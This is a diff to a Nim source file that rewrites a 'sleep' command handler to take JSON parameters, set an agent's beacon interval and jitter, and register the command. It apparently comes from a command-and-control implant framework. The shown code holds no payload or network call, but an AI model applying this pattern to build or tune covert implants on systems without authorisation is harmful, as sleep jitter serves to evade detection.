@@ -1,17 +1,25 @@
-import std/strutils
+import std/[json, strutils]
+import ../types
+import ./registry
 
-proc runSleep*(params: string, sleepInterval: var int, jitterPercent: var int): string =
-  ## Update sleep interval and optional jitter.
-  ## params format: '{"interval": 30, "jitter": 10}'
-  ## or simple: "30" or "30 10"
-  let parts = params.strip().split()
-  if parts.len == 0 or parts[0].len == 0:
-    return "Error: interval required"
-
+proc sleepExecute(taskId: string, params: JsonNode, state: AgentState,
+                  send: SendMsg): TaskResult =
+  let intervalStr = params{"interval"}.getStr("")
+  let jitterStr   = params{"jitter"}.getStr("")
+  if intervalStr.len == 0:
+    return TaskResult(output: "Error: interval required",
+                      status: "error", completed: true)
   try:
-    sleepInterval = parseInt(parts[0])
-    if parts.len > 1:
-      jitterPercent = parseInt(parts[1])
-    result = "Sleep set to " & $sleepInterval & "s with " & $jitterPercent & "% jitter"
-  except ValueError:
-    result = "Error: invalid interval value"
+    state.sleepInterval = parseInt(intervalStr)
+    if jitterStr.len > 0:
+      state.jitter = parseInt(jitterStr)
+    return TaskResult(
+      output: "Sleep: " & $state.sleepInterval & "s, jitter: " & $state.jitter & "%",
+      status: "success",
+      completed: true,
+    )
+  except ValueError as e:
+    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)
+
+proc initSleep*() =
+  register("sleep", sleepExecute)
